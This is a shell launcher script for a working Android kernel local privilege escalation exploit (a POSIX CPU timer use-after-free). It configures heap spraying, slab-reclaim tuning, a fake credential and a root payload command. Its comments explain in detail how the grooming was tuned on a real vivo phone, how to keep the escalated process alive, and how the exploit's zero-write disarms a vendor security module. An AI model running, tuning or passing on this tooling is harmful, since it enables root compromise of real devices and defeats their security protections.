#!/system/bin/sh
# run_lpe.sh -- phone-side launcher for the POSIX CPU timer LPE.
#
# The binary (ic-timer) is the exploit itself; this script only supplies the
# environment the offline harness validated, so the two stay in sync by
# construction.  It must run as the ordinary adb shell uid (2000) in
# u:r:shell:s0, with SELinux enforcing: everything after that is the exploit's
# job, including interning the target context and staging the payload.
#
# Everything it writes lives under /data/local/tmp (shell-owned): nothing
# touches partitions, /data/adb or the boot image.
#
#   ATTEMPTS=32 sh /data/local/tmp/run_lpe.sh
#
# Success looks like
#   [ctxmap] u:r:ksu:s0 = sid N
#   [helper] launched euid=0 uid=-128 probe_err=0 ctx=u:r:ksu:s0
#   uid=0(root) ... LPE-PROOF
# A run with no "case L=" line at all just means every leak landed on an
# unsupported timer offset (7 of 31 are supported): rerun with more attempts.
#
# This is the configuration of the first real-device success (run18,
# 2026-10-25): attempt 0, L=0x78 (k=0), euid 0 in u:r:ksu:s0, no reboot.
#
# Why IC_EARLY_WAIT / IC_EARLY_GATE are forced off: release_posix_timer()
# frees the k_itimer through call_rcu(), and a probe (pcpwho) showed the
# callback runs on the CPU that issued timer_delete(), so X lands at the head
# of that CPU's order-1 Unmovable pageset list ~26-48 ms after the flush
# delete.  The earlier gate waited for that drop in /proc/slabinfo and then
# fopen()ed /proc/zoneinfo -- a struct file (filp, an order-1 slab) plus a
# dentry (also order-1) allocated exactly while X sat at the pageset head.
# That thief is why run17 captured only 1/5.  The counter read is now a
# pread() on a pre-opened fd, and the spray is already allocating when the
# RCU callback lands, so the next slab allocation takes X's page.
#
# SAFE_FILL (default 4000) makes a failed capture non-fatal.  When the spray
# misses, the victim's timer slab is still free, and its node contents are a
# SLAB_FREELIST_HARDENED-obfuscated pointer: the reap's rb_erase would fault
# and, with panic_on_oops=1, reboot the phone.  The fill creates SIGEV_NONE
# timers in that window, so a miss is reclaimed by a freshly zeroed k_itimer
# (children 0) and the reap reports "no leak" instead of panicking.  The spray
# always runs first, so a captured node is never touched by the fill.  Set
# SAFE_FILL=0 only when debugging.
#
# LATE_FILL (default 2000) is a second batch of the same timers right before
# the reap, after the flush delete's call_rcu() frees have been given time to
# land.  Those frees trickle in over hundreds of milliseconds, so X's slab can
# empty long after the first fill; the page then reaches cpu0's pageset with
# no allocator left to take it.  The late batch takes any such page back as
# zeroed k_itimer objects.  A captured page is a kmalloc-256 slab by then, so
# the late fill cannot overwrite it.
#
# SLABSNAP=1 samples every tracked cache's num_objs before and after the
# spray and prints the diff.  On a miss the page went to *some* order-1
# cache; this is what names it (and on a capture only our own counters move).
# The psl path has no readable mapping, so this diff is the only evidence
# available about who took the page.
#
# SKBF_MIN (default 8) frees only a handful of the queued order-2 datagrams
# before the spray; one free is enough to bulk-drain the primed per-CPU page
# lists and hand the discarded timer slab to the spray, while freeing all
# 32320 of them (496 MB of order-2 blocks) right before the spray is what
# buried the slab on the phone.  The rest are freed after the fill, when the
# block is either already captured or out of reach.  The old full flush only
# comes back when IC_SKBF_MIN is unset entirely (a raw run of the binary);
# SKBF_MIN=0 or an empty value is clamped to 8.
#
# IC_ATTEMPT_WAIT is in 200 ms ticks, not seconds: the supervisor forks the
# next attempt when one is still running after IC_ATTEMPT_WAIT*200 ms.  The
# old 150 (30 s) was shorter than a real attempt on this phone (30-60 s from
# start to the spray), and when the watchdog fired mid-attempt the fresh
# attempt's order-1 allocations stole the captured timer page: run20 lost the
# capture that way and the next reap B panicked the kernel.  900 ticks
# (180 s) is longer than any healthy attempt and keeps attempts serial.
# Never let attempts overlap: the slab chain (base/A/B/C) assumes the timer
# slab is quiet, which a concurrent attempt breaks.
#
# Each attempt that leaks an unsupported timer offset parks instead of
# exiting: the stale node sits in one of our psl pages, and exiting would
# walk it (timerqueue_del WARN, or a fault if panic_on_warn is set).  A parked
# attempt keeps its ~600 psl sockets open (~10 MB kernel memory) until reboot
# and must never be killed -9.  With ATTEMPTS=16 that is up to ~160 MB held by
# orphaned processes after the run; reboot to reclaim it.

set -u

# Not part of the validated configuration any more: see the header.
unset IC_EARLY_WAIT IC_EARLY_GATE

# The attempt process that finally owns the fake cred must outlive this adb
# session: when the PTY closes, the kernel sends SIGHUP to the foreground
# process group, and killing that process runs release_task() through the
# rewritten timer node, which oopses the kernel (see timer_lpe.c: "a parked
# attempt must hang").  Ignored dispositions survive execve(), so every
# descendant -- attempt child, workers, payload -- is immune to HUP/INT/TERM.
# Only SIGKILL can still break the parked chain, so do not kill -9 it.
trap '' HUP INT TERM

# Identity of the machine this log came from, as the first line of every run.
# The two test phones were only distinguishable after the fact, by the SIGRT
# set size in /proc/self/status ([peak] sigpending); a log that names itself
# removes that guesswork, and the memory size is what decides whether the
# 496 MB flush can even happen.
ident() { getprop "$1" 2>/dev/null; }
devmem=$(sed -n 's/^MemTotal:[[:space:]]*\([0-9]*\).*/\1/p' /proc/meminfo 2>/dev/null)
echo "[dev] model=$(ident ro.product.model) device=$(ident ro.product.device) sdk=$(ident ro.build.version.sdk) build=$(ident ro.build.display.id) kernel=$(uname -r 2>/dev/null) arch=$(uname -m 2>/dev/null) mem=${devmem:-?}kB ksu=$( [ -d /data/adb/ksu ] && echo yes || echo no)"
# What the binary itself will report for the same run.
echo "[dev] run uid=$(id -u 2>/dev/null) ctx=$(cat /proc/self/attr/current 2>/dev/null) enforce=$(getenforce 2>/dev/null) panicoops=$(cat /proc/sys/kernel/panic_on_oops 2>/dev/null)"
echo "[dev] version=$(cat /proc/version 2>/dev/null)"

DIR=/data/local/tmp
DROP="$DIR/ic-dropdir"
STAGE="$DIR/ic-stage"
# IC_BIN lets a launcher hand out a fresh copy each run: truncating an ELF that
# parked attempts still execute would SIGBUS them, and a dying attempt walks a
# rewritten timer node.  Default is unchanged for the adb workflow.
BIN="${IC_BIN:-$DIR/ic-timer}"

# Each attempt leaks at most one timer node, and only 7 of the 31 possible
# node offsets are supported, so the count is the main success knob.
ATTEMPTS="${ATTEMPTS:-16}"
# The first thing the escalated task does is disarm vivo's vr.ko.  That module
# hooks __tracepoint_sys_exit and kills app-origin tasks that reach syscall
# exit as root, so a root obtained here would survive only until an app tried
# to use it.  IC_DISARM_VR stores 0 into the tracepoint's ->funcs through the
# exploit's own zero-write (GhostLock W1c); the address comes from kallsyms
# after opening up kptr_restrict, so it costs nothing when no vr is loaded --
# the child prints "no vr module" and returns without escalating.  It has to
# run in the background: a successful zero-write parks forever by design.
# IC_DISARM_MODE=0 selects the plain proof command; the app exposes the same
# choice as a spinner ("去探针(tracepoint): 开启/关闭") whose default is on.
#
# REPAIR (off by default) is only for a device already damaged by an OLD run
# that zeroed selinux_state from +0: that clears `initialized`, and every file
# created in the window is left unlabeled and denied after the next enforcing
# boot.  This chain (mcast) never writes selinux_state, and the fixed zero
# path targets state-7, so new runs cannot cause it; running `restorecon -R
# /data` on a healthy third-party device is an unnecessary risk.  Set
# IC_REPAIR=1 on a device that already shows unlabeled files.  ``sync`` keeps
# the new xattrs on disk before anything else touches the tree.
REPAIR=""
if [ "${IC_REPAIR:-0}" != "0" ]; then
	REPAIR='restorecon -R /data 2>/dev/null && echo RESTORE-OK || echo RESTORE-FAIL; sync;'
fi
if [ "${IC_DISARM_MODE:-1}" = "0" ]; then
	PAYLOAD_CMD="${PAYLOAD_CMD:-$REPAIR id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF}"
else
	PAYLOAD_CMD="${PAYLOAD_CMD:-$REPAIR ( IC_DISARM_VR=1 "$BIN" ) & id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF}"
fi

[ -x "$BIN" ] || { echo "missing $BIN" >&2; exit 1; }

# Created while the real identity still owns the process: the fake cred has
# fsuid 0 and no capabilities, so it can neither mkdir here nor chmod.
mkdir -p "$DROP" "$STAGE" || exit 1
chmod 0777 "$DROP" 2>/dev/null

exec env PATH=/sbin:/system/bin:/system/xbin \
    IC_PEAK=1 \
    IC_FORK=1 \
    IC_REVERSE=1 \
    IC_PC=0 \
    IC_PEAK_SKBF=1 \
    IC_KEEP_POOL=1 \
    IC_SKBF_MIN="${SKBF_MIN:-8}" \
    IC_AIO_NOFAULT=1 \
    IC_AIO_NOREMAP=1 \
    IC_ANON_PAGES=0 \
    IC_AIO_EVENTS=1 \
    IC_VMA_KEEP=10 \
    IC_AIO_CTXS=16384 \
    IC_VMA_PREWARM=16384 \
    IC_STAGING_DIR="$STAGE" \
    IC_REAL_INIT_USER_NS="${IC_REAL_INIT_USER_NS:-}" \
    IC_SPRAY=mcast \
    IC_FILP_SHIELD=18000 \
    IC_KM64_SHIELD=4096 \
    IC_ATTEMPT_WAIT="${IC_ATTEMPT_WAIT:-900}" \
    IC_ATTEMPTS="$ATTEMPTS" \
    IC_SCAN=1 \
    IC_SCAN_CTXMAP="${IC_SCAN_CTXMAP:-u:r:ksu:s0}" \
    IC_INTERN_SELF=1 \
    IC_PREP_DROP=1 \
    IC_SCAN_DROP_DIR="$DROP" \
    IC_DROP_MODE=7 \
    IC_SCAN_EXIT_AFTER_DROP=1 \
    IC_SAFE_FILL="${SAFE_FILL:-4000}" \
    IC_LATE_FILL="${LATE_FILL:-2000}" \
    IC_SLABSNAP=1 \
    IC_SLABTRACE=1 \
    IC_PAD_ALIGN=1 \
    IC_SPRAY_EARLY=1 \
    IC_EARLY_PRIME=1024 \
    IC_SKB_SOCKS=8 \
    IC_PAD_KEEP=4185 \
    IC_FLUSH_SPARSE=15 \
    IC_PAYLOAD_CMD="$PAYLOAD_CMD" \
    "$BIN"
